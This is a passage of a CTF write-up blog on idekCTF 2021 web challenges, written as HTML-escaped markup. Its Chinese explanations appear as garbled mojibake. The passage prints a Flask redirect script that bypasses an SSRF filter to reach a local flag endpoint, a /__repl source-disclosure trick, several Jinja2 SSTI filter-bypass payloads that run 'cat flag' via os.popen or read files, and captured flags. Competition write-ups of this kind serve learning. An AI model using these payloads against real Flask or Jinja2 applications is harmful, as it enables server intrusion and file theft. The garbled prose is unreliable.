&lt;p>‰∫éÊòØÊàëÂ∞ùËØïÊûÑÈÄ†‰∏Ä‰∏™ÊÅ∂ÊÑèhtmlÈ°µÈù¢ÂåÖÂê´‰∏Ä‰∏™Ë∑≥ËΩ¨ÁöÑjsËÑöÊú¨Ôºå‰ΩÜÊòØÂ≠¶Ëâ∫‰∏çÁ≤æ ÊûÑÈÄ†Â§±Ë¥•‰∫ÜÔºõÈöèÂêéÊàëÂèàÂ∞ùËØï‰∫ÜDNSÈáçÁªëÂÆöÔºå‰ΩÜÊòØ‰ºöË¢´Ê£ÄÊµãÂá∫Êù•ÂØºËá¥Âà©Áî®Â§±Ë¥•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213132823135.png" alt="image-20211213132823135">&lt;/p>
&lt;p>ÂêéÊù•Áúã‰∫Üdiscord‰∏≠ÁöÑËß£Á≠î&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211215212432931.png" alt="image-20211215212432931">&lt;/p>
&lt;p>ÊâÄ‰ª•ËØ¥ÈáçÁªëÂÆöËøòÊòØÂèØË°åÁöÑÔºåÂõ†‰∏∫Âú®‰∏Ä‰∏™ÂüüÂêçË¢´ÂèçÂ§çÊ®™Ë∑≥Âú∞Ëß£ÊûêipÂú∞ÂùÄÔºåÂ¶ÇÊûúÁ¨¨‰∏ÄÊ¨°Ë¢´Ëß£Êûê‰∏∫Êàë‰ª¨ÊúçÂä°Âô®Âú∞Âú∞ÂùÄËÄåÁ¨¨‰∫åÊ¨°ËøîÂõû127.0.0.1Â∞±ÂèØ‰ª•ËææÂà∞SSRFÂú∞ÊïàÊûú‰∫ÜÔºõ‰∏çËøáÁúãwp‰πãÂêéÂèëÁé∞Áõ¥Êé•Áî®python‰ºöÊõ¥ÁÆÄÂçï&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">redirect&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">threading&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Thread&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">local_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://yourvps_ip:port/&amp;#34;&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">reqCounter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">global&lt;/span> &lt;span style="color:#111">reqCounter&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">reqCounter&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reqCounter&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;hey&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">reqCounter&lt;/span> &lt;span style="color:#f92672">-=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://localhost:1337/flag&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">start_server&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">88&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">send_payload&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://difference-check.chal.idek.team/diff&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;url1&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">local_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;url2&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://v3zbv72qksii3rrtyl113zsi096zuo.burpcollaborator.net/&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">start_server&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">send_payload&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213132943376.png" alt="image-20211213132943376">&lt;/p>
&lt;p>&lt;code>idek{d1ff3r3nc3_ch3ck3r_d3ce1v3d_bY_d1ff3r3nc3s}&lt;/code>&lt;/p>
&lt;p>‰ΩøÁî®ÈáçÂÆöÂêëÁöÑÊñπÂºèÔºåÈÅøÂºÄssrfFilterÁöÑËøáÊª§ÔºåÂ≠¶Âà∞‰∫Ü&lt;/p>
&lt;h2 id="sourceless-guessy-web">Sourceless Guessy Web&lt;/h2>
&lt;blockquote>
&lt;p>&amp;ldquo;If it has a website its web&amp;rdquo;&lt;/p>
&lt;p>&lt;a href="https://sgw.chal.imaginaryctf.org/">https://sgw.chal.imaginaryctf.org/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>È¶ñÈ°µ‰∏äÊ≤°‰∏úË•øÔºåÂ∞±‰∏§Ë°åÂ≠ó&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212015231115.png" alt="image-20211212015231115">&lt;/p>
&lt;p>ËÄå‰∏î‰πü‰∏çËÉΩÁàÜÁ†¥ÔºåÂ∞ùËØï‰∫ÜÁªèÂÖ∏Ë∑ØÁî±ÈÉΩÊ≤°‰ªÄ‰πàÂèçÂ∫îÔºåÁúãÂÆ°Êü•ÂÖÉÁ¥†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213135213779.png" alt="image-20211213135213779">&lt;/p>
&lt;p>ÊäìÂåÖ‰ºöÁúãÂà∞ÂìçÂ∫îÂ§¥‰∏ÄÁõ¥Â∏¶ÁùÄ&lt;code>report-uri=&amp;quot;https://sentry.repl.it/api/10/security/?sentry_key=xxxx&lt;/code>ËøôÊ†∑ÁöÑ‰∏úË•øÔºåËÆøÈóÆ&lt;code>https://sgw.chal.imaginaryctf.org/__repl&lt;/code>Â∞±‰ºöÁúãÂà∞Ê∫êÁ†Å‰∫Ü&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213234458242.png" alt="image-20211213234458242">&lt;/p>
&lt;p>&lt;code>idek{why_do_people_keep_st0ring_secrets_0n_replit_w1th0ut_3nv}&lt;/code>&lt;/p>
&lt;h2 id="jinjailbaby-jinjail">JinJail&amp;amp;Baby JinJail&lt;/h2>
&lt;blockquote>
&lt;p>I&amp;rsquo;ve looked all over the internet for payloads or techniques to bypass my SSTI filter, but none would work! Surely this is secure?&lt;/p>
&lt;p>&lt;a href="http://jinjail.chal.idek.team">http://jinjail.chal.idek.team&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/JinJail/jinjail-dist.zip">https://ctf.idek.team/handouts/web/JinJail/jinjail-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>Jinjail was a bit harder than anticipated, so here&amp;rsquo;s a baby version without the character limit to familiarize yourself with some jinja2 SSTI techniques!&lt;/p>
&lt;p>&lt;a href="http://baby-jinjail.chal.idek.team">http://baby-jinjail.chal.idek.team&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/BabyJinJail/baby-jinjail-dist.zip">https://ctf.idek.team/handouts/web/BabyJinJail/baby-jinjail-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213165127940.png" alt="image-20211213165127940">&lt;/p>
&lt;p>ÔºàËøô‰∏™ÂõæÈáåÊ≥®ÈáäÊúâ‰∏Ä‰∫õ‰∏çÂØπÁöÑÂú∞Êñπ ÊáíÂæóÊîπ‰∫Ü&lt;/p>
&lt;p>ÊûÑÈÄ†Âç°Âà∞ÊàëÁöÑÂú∞ÊñπÊòØÁ¶ÅÁî®‰∫ÜÂçïÂèåÂºïÂè∑Ôºå‰∏ÄËà¨ÊÉÖÂÜµ‰∏ãËøáÊª§ÂºïÂè∑ÂèØ‰ª•‰ΩøÁî®&lt;code>chr()&lt;/code>Êù•Ë°®Á§∫Â≠óÁ¨¶Ôºå‰ΩÜÊòØËøô‰∏™ÊñπÊ≥ïÊúâÈúÄË¶ÅÁî®Âà∞Êï∞Â≠óÔºõÊàë‰ª¨Áé∞Âú®ÈúÄË¶ÅÁöÑÊòØ‰∏Ä‰∏™Á∫ØÂ≠óÊØçÁöÑSSTI payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># official payload&lt;/span>
&lt;span style="color:#111">{{&lt;/span>&lt;span style="color:#111">lipsum&lt;/span>&lt;span style="color:#111">[(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__globals__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]][(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]][(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">popen&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]]([(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cat&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">center&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">galf&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">reverse&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">)[(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">daer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#00a8c8">False&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">reverse&lt;/span>&lt;span style="color:#111">]()}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>lipsum&lt;/code>Ë∑ü&lt;code>url_for&lt;/code>, &lt;code>get_flashed_messages&lt;/code>‰∏ÄÊ†∑ÊòØ‰∏Ä‰∏™Âú®flask‰∏≠ÁöÑÂÜÖÁΩÆÂáΩÊï∞ÔºåÊØîÂ¶Ç&lt;code>url_for&lt;/code>ÂèØ‰ª•ËøôÊ†∑Áî®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂØπ‰∫éÂÖ≥ÈîÆÂ≠óÁöÑËøáÊª§‰ΩøÁî®‰∫Ü&lt;code>(dict()|list)[False]&lt;/code>ÁöÑÊñπÂºèËøõË°å‰∏Ä‰∏™ÁªïËøáÔºå‰ΩÜÊòØËØ¥ÂÆûËØùÊàëÂπ∂‰∏çÊ∏ÖÊ•öËøô‰∏™&lt;code>False&lt;/code>ÁöÑÁî®ÊÑèÊòØ‰ªÄ‰πàÔºåÂ¶ÇÊûú‰∏çÂ∏¶&lt;code>False&lt;/code>ÊàñÁî®‰∫Ü&lt;code>True&lt;/code>ËøîÂõûÁöÑÁªìÊûúÈÉΩÊòØÁ©∫ÁöÑÔºåÊàë‰πüÊ≤°ÊúâÊü•Âà∞Áõ∏ÂÖ≥ÁöÑËµÑÊñôÔºàÂ¶ÇÊûúÊúâÂ∏¶Â∏àÂÇÖÁúãÂà∞‰∫ÜËØ∑Âä°ÂøÖÊåáÊïôÔºÅÔºÅÔºÅ&lt;/p>
&lt;p>ËøòÊúâ‰ªédiscordÈáåÁúãÂà∞ÁöÑÂÖ∂ÂÆÉÁâàÊú¨ÁöÑpayloadÔºå‰πüÊòØÁî®Âà∞‰∫ÜÂêÑÁßçÂêÑÊ†∑ÁöÑËøáÊª§Âô®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__cl&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">ass__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__subcl&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">asses__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">]()[&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">gc&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">aaaaaaaaaaaaaaaaaa&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">count&lt;/span>&lt;span style="color:#111">))]()[&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">fl&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">ag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#111">]()}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Â¶ÇÊûúÊê≠ÈÖç‰∏ä&lt;code>dict()&lt;/code>ËøôÊ†∑ÁöÑÁî®Ê≥ï‰πüÊòØÂèØ‰ª•Êé•&lt;code>|attr()&lt;/code>ÁöÑÔºå‰∏äÈù¢ÊàëÂÜôÁöÑÊ≥®ÈáäÂπ∂Ê≤°ÊúâËÄÉËôëÂà∞Ëøô‰∏ÄÁÇπÔºåÊàëÁöÑÔºàÂõ†‰∏∫ÂÅöÈ¢òÁöÑÊó∂ÂÄôËøò‰∏çÊ∏ÖÊ•öËøô‰∫õÂ•áÂ¶ôÁöÑËøáÊª§Âô®Êìç‰ΩúÔºåÂ≠¶Âà∞ÂíØ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{{((((&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__mro__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">last&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__subclas&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">bdict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ses__&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#111">)()))[([&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">length&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">length&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">b&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">length&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">])(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">fla&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">bdict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">g&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">attr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">_x&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">first&lt;/span>&lt;span style="color:#111">)()}}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213140710659.png" alt="image-20211213140710659">&lt;/p>
&lt;p>&lt;code>idek{us1nG_f1lt3rs_t0_byP4s5_f1lt3r5}&lt;/code>&lt;/p>
&lt;h2 id="fancy-notes">fancy-notes&lt;/h2>
&lt;blockquote>
&lt;p>Your typical note taking app, but this time it&amp;rsquo;s fancy! Share your coolest notes with the admin, and if they&amp;rsquo;re cool enough, maybe he&amp;rsquo;ll give you a special prize.&lt;/p>
&lt;p>&lt;a href="http://fancy-notes.chal.idek.team">http://fancy-notes.chal.idek.team&lt;/a> | &lt;a href="https://ctf.idek.team/handouts/web/FancyNotes/fancy-notes-dist.zip">https://ctf.idek.team/handouts/web/FancyNotes/fancy-notes-dist.zip&lt;/a>&lt;/p>
&lt;/blockquote>
